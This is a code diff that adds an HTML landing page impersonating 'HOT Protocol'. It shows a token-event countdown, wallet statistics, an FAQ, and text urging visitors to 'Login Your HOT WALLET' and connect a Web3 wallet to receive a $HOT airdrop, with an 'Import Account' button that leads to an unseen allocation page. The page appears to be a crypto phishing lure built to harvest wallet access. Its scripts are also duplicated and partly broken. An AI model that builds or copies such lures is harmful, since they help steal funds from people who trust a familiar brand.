@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HOT Protocol</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', Arial, sans-serif;
+      color: #c9d1d9;
+      text-align: center;
+      background: black;
+      overflow: auto;
+      position: relative;
+    }
+
+    /* Glowing background */
+    body::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle at center, rgba(255, 199, 0, 0.2), transparent 70%);
+      z-index: 0;
+      animation: rotate 30s linear infinite;
+    }
+
+    @keyframes rotate {
+      from {
+        transform: rotate(0deg);
+      }
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    header,
+    main,
+    footer {
+      position: relative;
+      z-index: 1;
+    }
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 20px;
+      background: rgba(0, 0, 0, 0.7);
+    }
+
+    .branding {
+      display: flex;
+      align-items: center;
+    }
+
+    .logo img {
+      width: 40px;
+      height: 40px;
+    }
+
+    .text {
+      font-size: 24px;
+      font-weight: bold;
+      color: #ff9900;
+      margin-left: 10px;
+    }
+
+    .search-bar {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .search-bar input {
+      padding: 5px 10px;
+      font-size: 14px;
+      border-radius: 5px;
+      border: 1px solid #ff9900;
+      background: rgba(255, 199, 0, 0.1);
+      color: #c9d1d9;
+      width: 120px;
+    }
+
+    .search-bar input::placeholder {
+      color: #8b949e;
+    }
+
+    .search-bar button {
+      padding: 5px 8px;
+      font-size: 14px;
+      background: #ff9900;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .search-bar button:hover {
+      background: #cc7a00;
+    }
+
+    .countdown-container {
+      background: rgba(255, 199, 0, 0.1);
+      padding: 20px;
+      border-radius: 10px;
+      margin: 20px auto;
+      max-width: 500px;
+      box-shadow: 0 0 15px rgba(255, 199, 0, 0.2);
+      text-align: center;
+    }
+
+    .countdown-container h2 {
+      font-size: 24px;
+      font-weight: bold;
+      color: #ffcc00;
+      margin-bottom: 10px;
+    }
+
+    .timer {
+      display: flex;
+      justify-content: space-around;
+      font-size: 18px;
+      font-weight: bold;
+      color: #ffffff;
+    }
+
+    .timer div {
+      text-align: center;
+      margin: 0 10px;
+    }
+
+    .timer span {
+      font-size: 36px;
+      color: #ffcc00;
+      display: block;
+    }
+
+    .timer p {
+      margin: 0;
+      font-size: 14px;
+      color: #c9d1d9;
+    }
+
+    main {
+      padding: 50px 20px;
+    }
+
+    h1 {
+      font-size: 32px;
+      color: #00ff7f;
+      margin-bottom: 20px;
+    }
+
+    .button {
+      background: #ff9900;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 18px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      margin-bottom: 40px;
+    }
+
+    .button:hover {
+      background: #cc7a00;
+    }
+
+    .stats-container {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 20px;
+      padding: 0 20px;
+    }
+
+    .stat-card {
+      background: rgba(255, 199, 0, 0.1);
+      border: 1px solid #ff9900;
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 0 15px rgba(255, 199, 0, 0.2);
+      text-align: center;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .stat-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 5px 20px rgba(255, 199, 0, 0.4);
+    }
+
+    .stat-card h3 {
+      font-size: 16px;
+      color: #ffcc00;
+      margin-bottom: 10px;
+    }
+
+    .stat-card h2 {
+      font-size: 28px;
+      color: #ffffff;
+    }
+
+    canvas {
+      max-width: 95%;
+      margin: 30px auto;
+    }
+
+    footer {
+      margin-top: 30px;
+      font-size: 14px;
+      color: #8b949e;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="branding">
+      <div class="logo">
+        <img src="https://i.imgur.com/LE1FxNt.png" alt="HOT Protocol Logo">
+      </div>
+      <div class="text">HOT PROTOCOL</div>
+    </div>
+  </header>
+
+  <div class="countdown-container">
+    <h2>HOT Token Generation Event</h2>
+    <div class="timer" id="countdownTimer">
+      <div><span id="days">00</span><p>Days</p></div>
+      <div><span id="hours">00</span><p>Hours</p></div>
+      <div><span id="minutes">00</span><p>Minutes</p></div>
+      <div><span id="seconds">00</span><p>Seconds</p></div>
+    </div>
+  </div>
+
+  <main>
+    <h1>Join the HOT revolution!</h1>
+    <p>Login Your HOT WALLET And Connect Your Web-3 Wallet To Recive $HOT Airdrop</p>
+    <button class="button" id="importButton" onclick="redirectToAllocation()">Import Account</button>
+
+<script>
+  // Countdown Timer Logic
+  const targetDate = new Date('2025-01-05T00:00:00').getTime();
+
+  function updateCountdown() {
+    const now = new Date().getTime();
+    const timeLeft = targetDate - now;
+
+    if (timeLeft <= 0) {
+      document.getElementById('countdownTimer').innerHTML = '<h3>Event Started!</h3>';
+      return;
+    }
+
+    const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+    const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+    const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+    const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+
+    document.getElementById('days').innerText = String(days).padStart(2, '0');
+    document.getElementById('hours').innerText = String(hours).padStart(2, '0');
+    document.getElementById('minutes').innerText = String(minutes).padStart(2, '0');
+    document.getElementById('seconds').innerText = String(seconds).padStart(2, '0');
+  }
+
+  setInterval(updateCountdown, 1000);
+
+  // Redirection to allocation.html
+  function redirectToAllocation() {
+    window.location.href = 'allocation.html';
+  }
+
+  // Bar Chart Logic
+  const ctx = document.getElementById('hotChart').getContext('2d');
+  new Chart(ctx, {
+    type: 'bar',
+    data: {
+      labels: ['HOT Burned', 'HOT Locked', 'MPC Wallets', 'HOT Supply'],
+      datasets: [{
+        label: 'HOT Protocol Statistics',
+        data: [5012071, 336448, 2574854, 328236274],
+        backgroundColor: ['#FF6F61', '#FFB74D', '#81C784', '#64B5F6'],
+        borderColor: ['#FF3D34', '#FF9800', '#4CAF50', '#1976D2'],
+        borderWidth: 1
+      }]
+    },
+    options: {
+      scales: {
+        y: {
+          beginAtZero: true
+        }
+      }
+    }
+  });
+
+  // FAQ Toggle
+  document.querySelectorAll('.faq-item h3').forEach(item => {
+    item.addEventListener('click', () => {
+      const parent = item.parentElement;
+      const paragraph = parent.querySelector('p');
+      const isHidden = paragraph.style.display === 'none' || !paragraph.style.display;
+      paragraph.style.display = isHidden ? 'block' : 'none';
+    });
+  });
+</script>
+    <div class="stats-container">
+      <div class="stat-card">
+        <h3>HOT Burned</h3>
+        <h2 id="hotBurned">5,012,071</h2>
+      </div>
+      <div class="stat-card">
+        <h3>HOT Locked</h3>
+        <h2 id="hotLocked">336,448</h2>
+      </div>
+      <div class="stat-card">
+        <h3>Total MPC Wallets</h3>
+        <h2 id="mpcWallets">2,574,854</h2>
+      </div>
+      <div class="stat-card">
+        <h3>Total HOT Supply</h3>
+        <h2 id="hotSupply">328,236,274</h2>
+      </div>
+    </div>
+  </main>
+
+  <section>
+    <h2>HOT Protocol Trends</h2>
+    <p>Analyze the latest statistics from HOT Protocol.</p>
+    <canvas id="hotChart"></canvas>
+  </section>
+
+  <section id="faq">
+    <h2 style="color: #ffcc00; margin-top: 50px;">Frequently Asked Questions</h2>
+    <div class="faq-container" style="text-align: left; max-width: 800px; margin: 20px auto; background: rgba(255, 199, 0, 0.1); border-radius: 10px; padding: 20px;">
+      <div class="faq-item" style="margin-bottom: 20px;">
+        <h3 style="color: white; cursor: pointer;">What is HOT Protocol?</h3>
+        <p style="color: #c9d1d9; display: none; margin-top: 10px;">HOT Protocol is a cutting-edge decentralized wallet solution designed to provide secure, user-friendly experiences for managing crypto assets.</p>
+      </div>
+      <div class="faq-item" style="margin-bottom: 20px;">
+        <h3 style="color: white; cursor: pointer;">How do I claim my $HOT airdrop?</h3>
+        <p style="color: #c9d1d9; display: none; margin-top: 10px;">Simply click on the "Claim Airdrop" button, and follow the instructions provided.</p>
+      </div>
+      <div class="faq-item">
+        <h3 style="color: white; cursor: pointer;">How does HOT Protocol ensure security?</h3>
+        <p style="color: #c9d1d9; display: none; margin-top: 10px;">We use Multi-Party Computation (MPC) technology to provide unparalleled security for your assets.</p>
+      </div>
+    </div>
+  </section>
+
+  <footer style="margin-top: 50px; padding: 20px 0; background: rgba(0, 0, 0, 0.9);">
+    <div style="margin-bottom: 20px; color: #8b949e;">Follow us on social media:</div>
+    <div class="social-icons" style="display: flex; justify-content: center; gap: 15px;">
+      <a href="#"><img src="https://i.imgur.com/t5eG4Bz.png" alt="Twitter" style="width: 30px; cursor: pointer;"></a>
+      <a href="#"><img src="https://i.imgur.com/OICb3oK.png" alt="Telegram" style="width: 30px; cursor: pointer;"></a>
+      <a href="#"><img src="https://i.imgur.com/QK44qUg.png" alt="Discord" style="width: 30px; cursor: pointer;"></a>
+    </div>
+    <div style="margin-top: 20px; color: #8b949e;">&copy; 2024 HOT Protocol. All rights reserved.</div>
+  </footer>
+
+  <script>
+    // Countdown Timer Logic
+    const targetDate = new Date('2025-01-05T00:00:00').getTime();
+
+    function updateCountdown() {
+      const now = new Date().getTime();
+      const timeLeft = targetDate - now;
+
+      if (timeLeft <= 0) {
+        document.getElementById('countdownTimer').innerHTML = '<h3>Event Started!</h3>';
+        return;
+      }
+
+      const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+
+      document.getElementById('days').innerText = String(days).padStart(2, '0');
+      document.getElementById('hours').innerText = String(hours).padStart(2, '0');
+      document.getElementById('minutes').innerText = String(minutes).padStart(2, '0');
+      document.getElementById('seconds').innerText = String(seconds).padStart(2, '0');
+    }
+
+    setInterval(updateCountdown, 1000);
+
+    // Import button click
+    document.getElementById("importButton").addEventListener("click", () => {
+      alert("Import functionality coming soon!");
+    });
+
+    // Bar Chart Logic
+    const ctx = document.getElementById('hotChart').getContext('2d');
+    new Chart(ctx, {
+      type: 'bar',
+      data: {
+        labels: ['HOT Burned', 'HOT Locked', 'MPC Wallets', 'HOT Supply'],
+        datasets: [{
+          label: 'HOT Protocol Statistics',
+          data: [5012071, 336448, 2574854, 328236274],
+          backgroundColor: ['#FF6F61', '#FFB74D', '#81C784', '#64B5F6'],
+          borderColor: ['#FF3D34', '#FF9800', '#4CAF50', '#1976D2'],
+          borderWidth: 1
+        }]
+      },
+      options: {
+        scales: {
+          y: {
+            beginAtZero: true
+          }
+        }
+      }
+    });
+
+    // FAQ Toggle
+    document.querySelectorAll('.faq-item h3').forEach(item => {
+      item.addEventListener('click', () => {
+        const parent = item.parentElement;
+        const paragraph = parent.querySelector('p');
+        const isHidden = paragraph.style.display === 'none' || !paragraph.style.display;
+        paragraph.style.display = isHidden ? 'block' : 'none';
+      });
+    });
+  </script>
+</body>
+</html>
+
